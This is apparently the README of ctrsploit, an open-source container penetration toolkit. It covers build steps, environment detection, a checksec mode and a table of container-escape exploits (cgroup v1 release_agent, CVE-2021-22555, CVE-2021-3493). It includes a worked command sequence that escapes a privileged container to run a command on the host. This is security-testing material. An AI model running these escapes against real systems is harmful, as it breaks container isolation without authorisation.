# ctrsploit: A penetration toolkit for container environment

[中文文档](./README-ZH.md)

ctrsploit [kənˈteɪnər splɔɪt]

## Why ctrsploit
see [here](https://github.com/ctrsploit/ctrsploit/discussions/11)

## Pre-Built Release

https://github.com/ctrsploit/ctrsploit/releases

## Self Build
### Build in Container
```bash
make binary && ls -lah bin/release
```

### Build in Local

```
make build-ctrsploit
```

## Usage

### Quick-Start

```
wget -O ctrsploit https://github.com/ctrsploit/ctrsploit/releases/download/v0.4/ctrsploit_linux_amd64 && chmod +x ctrsploit
./ctrsploit --help
NAME:
   ctrsploit - A penetration toolkit for container environment

ctrsploit is a command line ... //TODO


USAGE:
   ctrsploit [global options] command [command options] [arguments...]

COMMANDS:
   auto, a     auto gathering information, and detect vuls, and exploit // TODO
   exploit, e  run a exploit
   env, e      gather information // TODO
   help, h     Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --lang value  language for the greeting (default: "english")
   --help, -h    show help (default: false)
```

### gather information

usage

```
root@ctr:/# ./ctrsploit env
NAME:
   ctrsploit env - gather information

USAGE:
   ctrsploit env command [command options] [arguments...]

COMMANDS:
   where, w        detect whether you are in the container, and which type of the container
   graphdriver, g  detect graphdriver type and extend information
   cgroups, c      gather cgroup information
   help, h         Shows a list of commands or help for one command

OPTIONS:
   --help, -h  show help (default: false)
```

where

```
root@ctr:/# ./ctrsploit  env  w
INFO[0000] ===========Docker=========
.dockerenv exists: ✔
rootfs contains 'docker': ✔
cgroup contains 'docker': ✘
the mount source of /etc/hosts contains 'docker': ✔
hostname match regex ^[0-9a-f]{12}$: ✔
=> is in docker: ✔ 
INFO[0000] ===========k8s=========
/var/run/secrets/kubernetes.io exists: ✘
hostname match k8s pattern: ✘
the mount source of /etc/hosts contains 'pods': ✘
cgroup contains 'kubepods': ✘
=> is in k8s: ✘ 
```

### run a exploit

```
root@2aa13a052102:/# ./ctrsploit e
NAME:
   ctrsploit exploit - run a exploit

USAGE:
   ctrsploit exploit command [command options] [arguments...]

COMMANDS:
   cgroupv1-release_agent, ra                       escape tech by using the notify_on_release of cgroup v1
   cgroupv1-release_agent-unknown_rootfs, ra3       escape tech by using the notify_on_release of cgroup v1 without known rootfs
   help, h                                          Shows a list of commands or help for one command

OPTIONS:
   --help, -h  show help (default: false)

```

eg. : escape by 'cgroupv1-release_agent' tech.

```
root@host # docker run -ti --rm --security-opt="apparmor=unconfined" --cap-add="sys_admin" busybox
root@ctr # wget -O ctrsploit https://github.com/ctrsploit/ctrsploit/releases/download/v0.4/ctrsploit_linux_amd64 && chmod +x ctrsploit
root@ctr # ./ctrsploit e ra -c "cat /etc/hostname"
```

### check security
Just execute `ctrsploit checksec` or standalone binary file `checksec` in the container.

```
[root@ctr ~]# /checksec_linux_amd64 
===========Seccomp=========
kernel supported: ✔
seccomp enabled in current container: ✘

===========Apparmor=========
Kernel Supported: ✘
Container Enabled: ✘

===========Cgroups=========
is cgroupv1: ✔
is cgroupv2: ✘

------sub systems-------
["perf_event" "memory" "net_cls" "cpuset" "blkio" "hugetlb" "files" "cpu" "cpuacct" "pids" "rdma" "freezer" "devices" "net_prio"]

--------top level subsystem----------
["rdma"
```

## Details

### env

| command | alias | description |
| --- | --- | --- |
| [where](./env/where) | w | detect whether you are in the container, and which type of the container |
| [graphdriver](./env/graphdriver) | g | detect graphdriver type and extend information |
| [cgroups](./env/cgroups) | c | gather cgroup information |
| [capability](./env/capability) | cap | show the capability of pid 1 and current process |
| [seccomp](./env/seccomp) | s | show the seccomp info |
| [apparmor](./env/apparmor) | a | show the apparmor info |

### exploit

| exploit | alias | description |
| --- | --- | --- |
| [cgroupv1-release_agent](./exploit/cgroupv1-release_agent) | ra | escape tech by using the notify_on_release of cgroup v1 |
| [cgroupv1-release_agent-unknown_rootfs](./exploit/cgroupv1-release_agent-unknown_rootfs) | ra3 | escape tech by using the notify_on_release of cgroup v1 without known rootfs |
| [cve-2021-22555_ubuntu18.04](./exploit/CVE-2021-22555_ubuntu18.04) | 22555 | escape tech by using the CVE-2021-22555 (ubuntu18.04) |

### helper
| helper | alias | description |
| --- | --- | --- |
| [cve-2021-3493](./helper/cve-2021-3493) | ubuntu-overlayfs-pe,3493 | Ubuntu OverlayFS Local Privesc |

### checksec
Just execute `ctrsploit checksec` or standalone binary file `checksec`.